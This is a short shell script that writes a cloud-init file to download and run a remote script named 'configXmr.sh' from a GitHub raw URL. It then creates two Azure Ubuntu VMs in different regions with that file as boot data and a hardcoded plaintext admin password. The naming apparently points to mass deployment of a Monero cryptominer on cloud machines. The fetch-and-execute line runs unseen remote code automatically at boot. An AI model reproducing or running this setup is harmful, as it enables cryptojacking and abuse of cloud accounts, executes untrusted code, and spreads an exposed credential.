echo $'#!/bin/bash\nwget -O taind.sh https://raw.githubusercontent.com/anotheruser1811/xmr/main/configXmr.sh && chmod +x taind.sh && bash ./taind.sh' > cloud-init.txt
az vm create --resource-group eastus --name switzerlandnorth222 --location switzerlandnorth --image Canonical:UbuntuServer:18.04-LTS:latest --size Standard_DS2_v2 --admin-username azure --admin-password DinhTai12011992 --no-wait --custom-data cloud-init.txt
az vm create --resource-group eastus --name southeastasia222 --location southeastasia --image Canonical:UbuntuServer:18.04-LTS:latest --size Standard_DS2_v2 --admin-username azure --admin-password DinhTai12011992 --no-wait --custom-data cloud-init.txt
